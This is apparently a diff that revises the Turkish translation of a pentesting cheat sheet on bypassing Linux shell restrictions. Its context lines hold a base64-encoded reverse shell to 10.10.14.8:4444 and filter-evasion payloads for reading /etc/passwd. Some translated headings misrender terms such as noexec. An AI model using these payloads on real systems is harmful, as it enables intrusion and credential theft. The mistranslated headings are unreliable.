@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass Yolları ve Yasaklı Kelimeler
+### Bypass Paths ve yasaklı kelimeler
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -110,7 +110,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Boruları Atla
+### Boruları Atlatma
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -145,7 +145,7 @@ echo ${PATH:0:1} #/
 ### Yerleşik Komutlar
 
 Dış fonksiyonları çalıştıramıyorsanız ve yalnızca RCE elde etmek için **sınırlı bir yerleşik komut setine** erişiminiz varsa, bunu yapmanın bazı pratik yolları vardır. Genellikle **tüm** **yerleşik komutları** kullanamayacaksınız, bu yüzden hapisten kurtulmak için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten.\
-Öncelikle tüm [**kabuk yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** İşte bazı **öneriler**:
+Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** İşte bazı **öneriler**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -294,21 +294,21 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Salt-Okuma/Noexec/Distroless Bypass
+## Salt Okuma/Sadece Yazma/Distroless Bypass
 
-Eğer **salt-okuma ve noexec korumalarına** sahip bir dosya sistemindeyseniz veya hatta distroless bir konteynerdeyseniz, yine de **rastgele ikili dosyaları çalıştırmanın yolları vardır, hatta bir shell bile!:**
+Eğer **salt okuma ve sadece yazma korumaları** olan bir dosya sistemindeyseniz veya hatta bir distroless konteyner içindeyseniz, **rastgele ikili dosyaları çalıştırmanın, hatta bir shell'in bile yolları vardır!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & diğer Jails Bypass
+## Chroot & Diğer Hapis Bypass
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Alan Tabanlı Bash NOP Sled ("Bashsledding")
+## Uzay Tabanlı Bash NOP Sled ("Bashsledding")
 
 Bir zafiyet, nihayetinde `system()` veya başka bir shell'e ulaşan bir argümanı kısmen kontrol etmenize izin veriyorsa, yüklemenizin okunmaya başlandığı tam ofseti bilmeyebilirsiniz. Geleneksel NOP sled'leri (örneğin `\x90`) shell sözdiziminde **çalışmaz**, ancak Bash, bir komutu çalıştırmadan önceki boşlukları zararsız bir şekilde göz ardı eder.
 
@@ -333,7 +333,7 @@ Pratik kullanım durumları:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
 - [Terkedilmiş donanımlarda sıfır günleri istismar etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
